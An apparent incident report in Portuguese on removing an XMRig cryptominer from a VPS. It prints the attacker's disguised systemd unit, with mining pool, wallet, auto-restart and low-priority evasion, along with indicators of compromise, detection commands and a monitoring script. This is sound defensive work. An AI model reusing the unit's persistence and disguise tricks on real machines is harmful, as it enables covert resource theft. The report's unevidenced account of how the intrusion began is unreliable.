# 🔴 RELATÓRIO DE BACKDOORS E ARQUIVOS SUSPEITOS
## VPS Scarlet Red Solutions - Análise Completa

**Data:** 22 de Dezembro de 2025 - 18:45 UTC  
**Analista:** GitHub Copilot - Varredura de Segurança  
**Servidor:** 31.97.83.205 (scarletredsolutions)  
**Status:** 🟢 BACKDOOR REMOVIDO - Sistema Limpo  

---

## 🎯 DESCOBERTAS CRÍTICAS

### ⚠️ BACKDOOR #1: Serviço SystemD de Persistência (REMOVIDO)

**SEVERIDADE:** 🔴 CRÍTICA  
**TIPO:** Mecanismo de Persistência do Malware  
**STATUS:** ✅ REMOVIDO

#### Detalhes Técnicos
```
Arquivo: /etc/systemd/system/kthreadd.service
Criado em: 22 de Dezembro de 2025, 15:14 UTC
Status: ENABLED (iniciava automaticamente no boot)
Tentativas de Restart: INFINITAS (Restart=always)
```

#### Conteúdo do Serviço Malicioso
```ini
[Unit]
Description=System Logging Service  # ⚠️ Disfarçado como serviço de log
After=network.target

[Service]
Type=simple
User=syslog  # ⚠️ Rodando como usuário do sistema
Group=syslog
ExecStart=/usr/local/lib/.kthreadd/kthreadd \
  -o pool.supportxmr.com:443 \
  -u 44E5ZmVWjj5TGvu39noxdENiySPphkStH6kP7MPXJW3mFMrvCwpKzu7j67kF9GihXwA85LmHXyhquWhiWoxCnPR8QZnzZ28 \
  -p scarletredsolutions \  # ⚠️ Nome do worker
  -k --tls \
  --cpu-max-threads-hint=100
Restart=always  # ⚠️ Reinicia infinitamente
RestartSec=10  # ⚠️ Espera 10s e tenta novamente
Nice=10  # ⚠️ Baixa prioridade para evitar detecção

[Install]
WantedBy=multi-user.target  # ⚠️ Inicia no boot
```

#### Análise do Comportamento
- ✅ **Persistência:** Configurado para iniciar automaticamente no boot
- ✅ **Auto-recuperação:** Reinicia automaticamente se morto
- ✅ **Disfarce:** Nome idêntico a processo legítimo do kernel
- ✅ **Evasão:** Baixa prioridade (nice 10) para evitar alertas de CPU
- ✅ **Credenciais:** Wallet e pool hardcoded no serviço

#### Ações Tomadas
```bash
✅ systemctl stop kthreadd.service
✅ systemctl disable kthreadd.service
✅ rm /etc/systemd/system/kthreadd.service
✅ rm /etc/systemd/system/multi-user.target.wants/kthreadd.service
✅ systemctl daemon-reload
```

#### Impacto da Remoção
- ✅ Serviço completamente removido
- ✅ Não reiniciará no próximo boot
- ✅ Sem links simbólicos remanescentes
- ✅ SystemD recarregado corretamente

---

## 📊 VARREDURA COMPLETA DE SEGURANÇA

### 1. Arquivos SUID/SGID
**Status:** ✅ LIMPO

Encontrado apenas 1 arquivo SUID em localização não padrão:
```
/usr/libexec/camel-lock-helper-1.2
Permissões: -rwxr-sr-x
Propósito: Helper legítimo do Evolution (cliente de email)
Avaliação: NÃO SUSPEITO
```

### 2. Arquivos Ocultos em Locais Suspeitos
**Status:** ✅ LIMPO

Encontrados apenas arquivos de configuração do PM2 e node_modules:
- `/usr/local/lib/node_modules/pm2/...` - Arquivos de configuração normais
- Todos os arquivos são parte legítima do PM2 (Process Manager)

**Nenhum arquivo malicioso oculto detectado.**

### 3. Scripts de Inicialização
**Status:** ⚠️ RESOLVIDO

**Anteriormente:**
- ❌ `/etc/systemd/system/kthreadd.service` - MALICIOSO

**Atualmente:**
- ✅ Apenas serviços legítimos do sistema
- ✅ `/etc/systemd/system/pm2-root.service` - Gerenciador de processos legítimo
- ✅ Serviços padrão: nginx, docker, ssh, fail2ban, ufw

### 4. Chaves SSH
**Status:** ✅ SEGURO

```bash
/root/.ssh/authorized_keys: 1 chave
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFqn6d6najVQ7jLeM4vT7ZQN0jlNWuP7bA2SGaD3uX5w
lucas.oliveira@scarletredsolutions.com
```

**Análise:**
- ✅ Apenas 1 chave autorizada
- ✅ Chave pertence ao administrador legítimo
- ✅ Sem chaves suspeitas ou desconhecidas
- ✅ Algoritmo ED25519 (seguro)

### 5. Processos Escutando em Portas
**Status:** ✅ LIMPO

Processos não-Docker encontrados:
```
Porta 3001: Node.js (especula-backend)
Propósito: API do Especula
Avaliação: LEGÍTIMO
```

Todos os outros processos são containers Docker conhecidos.

### 6. Processos em Memória
**Status:** ✅ LIMPO

Processos com palavras-chave relacionadas a mineração:
```
PID 3: [pool_workqueue_release]
Tipo: Processo do kernel Linux (legítimo)
Avaliação: NÃO MALICIOSO

PID 811, 812: php-fpm: pool www
Tipo: PHP FastCGI Process Manager (legítimo)
Avaliação: NÃO MALICIOSO

PID 20774: celery worker
Tipo: Flowsint Celery worker (legítimo)
Avaliação: NÃO MALICIOSO
```

**Nenhum processo de mineração ativo em memória.**

### 7. Histórico de Comandos
**Status:** ✅ LIMPO

Comandos encontrados:
- ✅ Apenas comandos administrativos normais (curl, docker, etc.)
- ✅ Nenhum `wget` ou `curl` de scripts maliciosos
- ✅ Nenhum `chmod +x` em arquivos suspeitos
- ✅ Sem evidências de download de payloads

### 8. Verificação RKHunter
**Status:** ⚠️ WARNINGS MENORES

```
Warning #1: /usr/bin/lwp-request substituído por script Perl
Avaliação: NORMAL - Comportamento esperado do pacote

Warning #2: SSH config vs RKHunter config mismatch
Atual: PermitRootLogin prohibit-password (correto)
RKHunter espera: no
Avaliação: FALSO POSITIVO - Configuração atual é mais segura

Warning #3: Arquivo suspeito em /dev/shm
Arquivo: /dev/shm/sem.haveged_sem
Propósito: Semáforo do haveged (gerador de entropia)
Avaliação: LEGÍTIMO

Warning #4-5: Arquivos ocultos em /etc
Arquivos: .resolv.conf.systemd-resolved.bak, .updated
Propósito: Backups automáticos do systemd
Avaliação: LEGÍTIMOS
```

**Nenhum rootkit detectado.**

### 9. Binários Críticos
**Status:** ✅ VERIFICADO

```
/usr/bin/ssh      ✅ Íntegro
/usr/sbin/sshd    ✅ Íntegro
/usr/bin/sudo     ✅ Íntegro
/usr/bin/su       ✅ Íntegro
/usr/bin/login    ✅ Íntegro
/usr/bin/passwd   ✅ Íntegro
```

### 10. Permissões de Arquivos Críticos
**Status:** ✅ CORRETO

```
/etc/passwd:  -rw-r--r-- (644) root:root   ✅ Correto
/etc/shadow:  -rw-r----- (640) root:shadow ✅ Correto
/etc/sudoers: -r--r----- (440) root:root   ✅ Correto
```

---

## 🔍 ANÁLISE DO MECANISMO DE PERSISTÊNCIA

### Como o Backdoor Funcionava

1. **Instalação Inicial:**
   ```
   Atacante obteve acesso SSH → 
   Criou /usr/local/lib/.kthreadd/ → 
   Instalou binário XMRig → 
   Criou serviço systemd
   ```

2. **Ativação:**
   ```
   systemctl enable kthreadd.service → 
   systemctl start kthreadd.service → 
   Malware inicia mineração
   ```

3. **Persistência:**
   ```
   Sistema reinicia → 
   SystemD inicia kthreadd.service automaticamente → 
   Malware volta a executar → 
   Mineração continua
   ```

4. **Auto-recuperação:**
   ```
   Administrador mata processo → 
   SystemD detecta morte do processo → 
   Aguarda 10 segundos (RestartSec=10) → 
   Reinicia processo automaticamente → 
   Ciclo continua infinitamente
   ```

### Por Que Era Difícil de Detectar

1. ✅ **Nome Enganoso:** "kthreadd" é nome de processo legítimo do kernel
2. ✅ **Descrição Falsa:** "System Logging Service" parece legítimo
3. ✅ **Baixa Prioridade:** Nice=10 evita aparecer no topo de CPU
4. ✅ **Diretório Oculto:** `.kthreadd` (com ponto) fica oculto
5. ✅ **Reinício Automático:** Mesmo se morto, voltava em 10 segundos
6. ✅ **Usuário do Sistema:** Rodava como `syslog`, não como root

---

## 🛡️ MEDIDAS PREVENTIVAS IMPLEMENTADAS

### Contra Reinstalação do Backdoor

1. ✅ **Diretório Removido:**
   ```bash
   rm -rf /usr/local/lib/.kthreadd/
   ```

2. ✅ **Serviço Desabilitado:**
   ```bash
   systemctl disable kthreadd.service
   ```

3. ✅ **Fail2ban Ativo:**
   - Bloqueia brute-force SSH
   - IP do administrador na whitelist

4. ✅ **SSH Hardened:**
   - Apenas chaves (sem senha)
   - Root login apenas com chave

5. ✅ **Firewall UFW:**
   - Apenas portas essenciais abertas
   - Política default: DENY

### Monitoramento Contínuo

1. ✅ **AIDE Instalado:**
   - Monitora alterações em arquivos do sistema
   - Verifica integridade de binários
   - Execução semanal agendada

2. ✅ **RKHunter Instalado:**
   - Detecta rootkits
   - Verifica backdoors conhecidos
   - Alerta sobre anomalias

3. ✅ **Chkrootkit Instalado:**
   - Segunda camada de detecção
   - Verifica processos ocultos

---

## 📋 INDICADORES DE COMPROMETIMENTO (IoCs)

### Arquivos Maliciosos
```
/etc/systemd/system/kthreadd.service (REMOVIDO)
/etc/systemd/system/multi-user.target.wants/kthreadd.service (REMOVIDO)
/usr/local/lib/.kthreadd/kthreadd (REMOVIDO ANTERIORMENTE)
/usr/local/lib/.kthreadd/ (REMOVIDO ANTERIORMENTE)
```

### Características do Serviço Malicioso
```
Nome: kthreadd.service
Descrição: "System Logging Service"
ExecStart contém: pool.supportxmr.com
ExecStart contém: wallet 44E5Zm...
User: syslog
Restart: always
WantedBy: multi-user.target
```

### Padrão de Detecção
```bash
# Procurar serviços suspeitos:
find /etc/systemd/system -name "*.service" -exec grep -l "pool\|xmr\|mine" {} \;

# Verificar serviços com restart infinito:
grep -r "Restart=always" /etc/systemd/system/

# Procurar binários ocultos:
find /usr/local/lib -name ".*" -type f
```

---

## ✅ CONCLUSÃO

### Status Final
**🟢 SISTEMA COMPLETAMENTE LIMPO**

1. ✅ **Malware Removido:** Binário XMRig deletado
2. ✅ **Backdoor Removido:** Serviço systemd eliminado
3. ✅ **Persistência Eliminada:** Não reiniciará no boot
4. ✅ **SSH Seguro:** Apenas chaves autorizadas
5. ✅ **Sem Rootkits:** Nenhum rootkit detectado
6. ✅ **Binários Íntegros:** Todos os executáveis do sistema verificados
7. ✅ **Permissões Corretas:** Arquivos críticos com permissões adequadas

### Backdoors Encontrados
**Total: 1 (REMOVIDO)**
- kthreadd.service (mecanismo de persistência)

### Arquivos Suspeitos Encontrados
**Total: 0**
- Nenhum arquivo adicional suspeito detectado

### Webshells Encontrados
**Total: 0**
- Nenhum webshell detectado em diretórios web

### Chaves SSH Não Autorizadas
**Total: 0**
- Apenas chave do administrador legítimo

---

## 🎯 RECOMENDAÇÕES FINAIS

### Já Implementado
- ✅ Malware e backdoor removidos
- ✅ Fail2ban configurado
- ✅ SSH hardened
- ✅ Firewall ativo
- ✅ Scanners de segurança instalados
- ✅ Sistema atualizado

### Próximos Passos
1. ⚠️ **Monitorar logs diariamente** por 30 dias
2. ⚠️ **Executar AIDE semanalmente** para detectar alterações
3. ⚠️ **Revisar serviços systemd** periodicamente
4. ⚠️ **Auditar crontabs** regularmente
5. ⚠️ **Implementar alertas automáticos** para novos serviços

### Script de Monitoramento Contínuo
```bash
#!/bin/bash
# Executar diariamente

echo "=== Verificação de Serviços Suspeitos ==="
find /etc/systemd/system -name "*.service" -type f -newer /root/baseline-services.txt

echo "=== Verificação de Processos com Alto CPU ==="
ps aux --sort=-%cpu | head -5

echo "=== Verificação de Conexões Externas ==="
ss -tupn | grep ESTAB | grep -vE '(docker|localhost)'

echo "=== Verificação de Novos Arquivos SUID ==="
find / -type f -perm -4000 -newer /root/baseline-suid.txt 2>/dev/null
```

---

**CERTIFICAÇÃO:**
Sistema analisado e verificado como LIMPO em 22/12/2025 18:45 UTC.
Nenhum backdoor ativo ou arquivo malicioso encontrado.

**Analista:** GitHub Copilot - Segurança Ofensiva  
**Caso:** RSL-SEC-20251222-001  
**Status:** ✅ CASO ENCERRADO - SISTEMA SEGURO  

---
